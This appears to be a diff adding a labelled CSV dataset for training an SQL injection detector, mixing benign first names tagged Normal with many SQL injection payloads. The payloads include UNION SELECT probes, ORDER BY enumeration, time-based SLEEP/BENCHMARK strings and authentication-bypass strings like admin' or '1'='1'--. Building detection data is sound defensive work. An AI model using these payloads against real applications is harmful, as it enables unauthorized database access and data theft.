@@ -1,0 +1,4520 @@
+query,label
+query,Normal
+'John',Normal
+'Fran',Normal
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+"'1)) or benchmark(10000000,MD5(1))#'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
+'ORDER BY 2#',SQL Injection
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+"'admin""""/*'",SQL Injection
+'' AND id IS NULL; --',SQL Injection
+'Alice',Normal
+'Hank',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Jill',Normal
+'Grace',Normal
+'John',Normal
+'John',Normal
+'Alice',Normal
+"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
+'Alice',Normal
+'Hank',Normal
+'Bob',Normal
+'Charlie',Normal
+'||		(double pipe) concatenate',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
+''=0--+',SQL Injection
+'David',Normal
+'Hank',Normal
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Alice',Normal
+'Alice',Normal
+'Charlie',Normal
+'Hank',Normal
+'John',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+"'+benchmark(3200,SHA1(1))+''",SQL Injection
+'John',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
+'AND 7300=7300 AND ('pKlZ'='pKlY',SQL Injection
+'John',Normal
+'ORDER BY 1',SQL Injection
+"'admin""""/*'",SQL Injection
+'Alice',Normal
+"'and (select substring(@@version,3,1))='S''",SQL Injection
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+'Alice',Normal
+'Jill',Normal
+'Hank',Normal
+'WHERE 1=1 AND 1=1--',SQL Injection
+'pg_SLEEP(5)--',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'Eve',Normal
+'admin'or 1=1 or ''='',SQL Injection
+'Charlie',Normal
+"'benchmark(50000000,MD5(1))--'",SQL Injection
+'David',Normal
+'Fran',Normal
+'ORDER BY 27',SQL Injection
+'Hank',Normal
+'Alice',Normal
+'#	    Hash comment',SQL Injection
+'Bob',Normal
+'John',Normal
+"'') or benchmark(10000000,MD5(1))#'",SQL Injection
+'Charlie',Normal
+'Fran',Normal
+'admin' #',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
+'%		wildcard attribute indicator',SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 1,2--'",SQL Injection
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
+''',SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Fran',Normal
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
+'Charlie',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
+"'""""*""""'",SQL Injection
+'Bob',Normal
+'OR 1=1',SQL Injection
+"'"""" or """"x""""=""""x'",SQL Injection
+'Eve',Normal
+'+ SLEEP(10) + '',SQL Injection
+'Grace',Normal
+'David',Normal
+'John',Normal
+'David',Normal
+'Grace',Normal
+'Bob',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Alice',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#'",SQL Injection
+'Hank',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'",SQL Injection
+'John',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#'",SQL Injection
+'John',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+'ORDER BY 31337--',SQL Injection
+'Alice',Normal
+'John',Normal
+'or pg_SLEEP(5)--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+'Eve',Normal
+'Alice',Normal
+'Bob',Normal
+'\',SQL Injection
+'David',Normal
+'Alice',Normal
+"'and (select substring(@@version,3,1))='S''",SQL Injection
+'Jill',Normal
+'Alice',Normal
+'ORDER BY 28--',SQL Injection
+'ORDER BY SLEEP(5)#',SQL Injection
+'ORDER BY 12#',SQL Injection
+'Eve',Normal
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
+'Grace',Normal
+'Alice',Normal
+'Jill',Normal
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13'",SQL Injection
+'/',SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
+'AS INJECTX WHERE 1=1 AND 1=0',SQL Injection
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'",SQL Injection
+'John',Normal
+'Charlie',Normal
+'' OR EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
+'Grace',Normal
+'Alice',Normal
+'David',Normal
+'Charlie',Normal
+'Grace',Normal
+'Alice',Normal
+'Eve',Normal
+''));,SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
+'AS INJECTX WHERE 1=1 AND 1=0--',SQL Injection
+'Grace',Normal
+'Bob',Normal
+'OR 1=1',SQL Injection
+'Grace',Normal
+'Alice',Normal
+'Fran',Normal
+'Charlie',Normal
+'Bob',Normal
+'Charlie',Normal
+'Eve',Normal
+'Hank',Normal
+'Charlie',Normal
+'Fran',Normal
+'Eve',Normal
+'Fran',Normal
+'Charlie',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'",SQL Injection
+'1 AND (SELECT * FROM Users) = 1',SQL Injection
+'John',Normal
+'OR x=x',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9'",SQL Injection
+'/',SQL Injection
+'1) or sleep(5)#',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
+'Alice',Normal
+'Jill',Normal
+'Charlie',Normal
+'Alice',Normal
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15'",SQL Injection
+'ORDER BY 30--',SQL Injection
+''LIKE'',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'Alice',Normal
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--'",SQL Injection
+'Charlie',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
+"'admin"""") or """"1""""=""""1""""/*'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'",SQL Injection
+'Alice',Normal
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))'",SQL Injection
+'David',Normal
+'Fran',Normal
+'David',Normal
+'Hank',Normal
+'WHERE 1=1 AND 1=1',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+'Bob',Normal
+'Grace',Normal
+'AnD SLEEP(5)#',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
+'Fran',Normal
+"'"""")) or benchmark(10000000,MD5(1))#'",SQL Injection
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
+'AS INJECTX WHERE 1=1 AND 1=0#',SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),3,4#'",SQL Injection
+'Hank',Normal
+'Alice',Normal
+'Hank',Normal
+'Jill',Normal
+'Eve',Normal
+'ORDER BY 30',SQL Injection
+'Charlie',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
+'Fran',Normal
+'AS INJECTX WHERE 1=1 AND 1=0--',SQL Injection
+'Alice',Normal
+'AND 0',SQL Injection
+'Fran',Normal
+'Fran',Normal
+'Jill',Normal
+'Eve',Normal
+'/*  	C-style comment',SQL Injection
+'Alice',Normal
+'Grace',Normal
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#'",SQL Injection
+'Hank',Normal
+'David',Normal
+'David',Normal
+'John',Normal
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Eve',Normal
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
+'HAVING 1=0#',SQL Injection
+'David',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+'Fran',Normal
+'David',Normal
+'John',Normal
+'ORDER BY 27',SQL Injection
+'David',Normal
+'/',SQL Injection
+'John',Normal
+'' OR '1',SQL Injection
+'David',Normal
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+'Jill',Normal
+'&&SLEEP(5)--',SQL Injection
+'John',Normal
+'John',Normal
+'Hank',Normal
+'' OR '1'='1' --',SQL Injection
+'Hank',Normal
+'John',Normal
+'ORDER BY 15#',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
+'John',Normal
+'Bob',Normal
+'Bob',Normal
+'David',Normal
+'Charlie',Normal
+'John',Normal
+'Bob',Normal
+'Alice',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'",SQL Injection
+'Fran',Normal
+'Jill',Normal
+'Alice',Normal
+'John',Normal
+'Alice',Normal
+'David',Normal
+'Alice',Normal
+'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+'John',Normal
+'ORDER BY 30',SQL Injection
+"'benchmark(50000000,MD5(1))'",SQL Injection
+'Charlie',Normal
+'Grace',Normal
+'ORDER BY 28#',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
+'Eve',Normal
+'pg_SLEEP(5)#',SQL Injection
+'Bob',Normal
+'Bob',Normal
+'OR 1=0--',SQL Injection
+'Fran',Normal
+'Alice',Normal
+'Charlie',Normal
+'Fran',Normal
+'Fran',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
+'Grace',Normal
+'Fran',Normal
+'Eve',Normal
+'Fran',Normal
+"'-1' UNION SELECT 1,2,3--+'",SQL Injection
+"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
+'Jill',Normal
+'Fran',Normal
+'Alice',Normal
+'&&SLEEP(5)--',SQL Injection
+'OR 1=1',SQL Injection
+'admin' or '1'='1'--',SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'Alice',Normal
+'Jill',Normal
+'ORDER BY 29',SQL Injection
+"'admin""""or 1=1 or """"""""=""""'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9#'",SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'",SQL Injection
+'HAVING 1=0',SQL Injection
+'Eve',Normal
+'Eve',Normal
+'Fran',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+'Eve',Normal
+'Eve',Normal
+'admin' or '1'='1'/*',SQL Injection
+'Eve',Normal
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'John',Normal
+'Grace',Normal
+'Bob',Normal
+'David',Normal
+'Grace',Normal
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+'Eve',Normal
+'`',SQL Injection
+'Jill',Normal
+'David',Normal
+'Bob',Normal
+'Hank',Normal
+'Jill',Normal
+'ORDER BY 11',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+'Alice',Normal
+'AND 1=0#',SQL Injection
+'ORDER BY SLEEP(5)',SQL Injection
+'Eve',Normal
+'Charlie',Normal
+'David',Normal
+"'"""");",SQL Injection
+'ORDER BY 4',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#'",SQL Injection
+'David',Normal
+'Hank',Normal
+'Fran',Normal
+'Hank',Normal
+'Grace',Normal
+'David',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8#'",SQL Injection
+'Jill',Normal
+'') or pg_sleep(5)--',SQL Injection
+'+ SLEEP(10) + '',SQL Injection
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))'",SQL Injection
+''LIKE'',SQL Injection
+'David',Normal
+'John',Normal
+"'"""" or """"""""-""""'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
+'Charlie',Normal
+'Hank',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT USER(),SLEEP(5)--'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#'",SQL Injection
+'ORDER BY SLEEP(5)',SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
+'Grace',Normal
+'ORDER BY 30#',SQL Injection
+"'"""";",SQL Injection
+'John',Normal
+'Alice',Normal
+'Bob',Normal
+'Hank',Normal
+'Hank',Normal
+'AnD SLEEP(5)#',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'/*…*/',SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+'Alice',Normal
+'SLEEP(5)--',SQL Injection
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--'",SQL Injection
+"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'",SQL Injection
+'admin' or '1'='1',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'",SQL Injection
+'Jill',Normal
+'Eve',Normal
+'John',Normal
+'John',Normal
+'AND 1=0',SQL Injection
+'Alice',Normal
+'Jill',Normal
+"'"""" OR 1 = 1 -- -'",SQL Injection
+'John',Normal
+"''\""""'",SQL Injection
+'David',Normal
+'David',Normal
+'Hank',Normal
+'Grace',Normal
+'David',Normal
+'Bob',Normal
+'Eve',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Grace',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='',SQL Injection
+'' OR '1'='1',SQL Injection
+'-2',SQL Injection
+'AnD SLEEP(5)',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7'",SQL Injection
+'Charlie',Normal
+'David',Normal
+'Fran',Normal
+'Hank',Normal
+'John',Normal
+'Alice',Normal
+'Bob',Normal
+'David',Normal
+Microservice running on port 84563,Normal
+'David',Normal
+'ORDER BY 13',SQL Injection
+'Grace',Normal
+'' OR '1'='1' --',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'Grace',Normal
+"'benchmark(50000000,MD5(1))'",SQL Injection
+'Jill',Normal
+'Eve',Normal
+'Alice',Normal
+'Hank',Normal
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#'",SQL Injection
+'ORDER BY 18',SQL Injection
+'ORDER BY 9',SQL Injection
+'Hank',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#'",SQL Injection
+'&&SLEEP(5)#',SQL Injection
+'Jill',Normal
+'Bob',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'/*  	C-style comment',SQL Injection
+'Alice',Normal
+'Charlie',Normal
+'Charlie',Normal
+'Bob',Normal
+'ORDER BY 31337#',SQL Injection
+'Hank',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+'Bob',Normal
+Microservice running on port 3000,Normal
+'Fran',Normal
+'David',Normal
+'Alice',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='',SQL Injection
+'UNION ALL SELECT 1',SQL Injection
+'John',Normal
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'",SQL Injection
+'ORDER BY 26#',SQL Injection
+'Eve',Normal
+'Jill',Normal
+'Hank',Normal
+'Eve',Normal
+'Alice',Normal
+'Hank',Normal
+'ORDER BY 10',SQL Injection
+'Fran',Normal
+'Grace',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+'ORDER BY 17',SQL Injection
+'David',Normal
+'ORDER BY 21#',SQL Injection
+'Fran',Normal
+'Alice',Normal
+'Bob',Normal
+'Alice',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),3--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
+'ORDER BY SLEEP(5)',SQL Injection
+'Hank',Normal
+'John',Normal
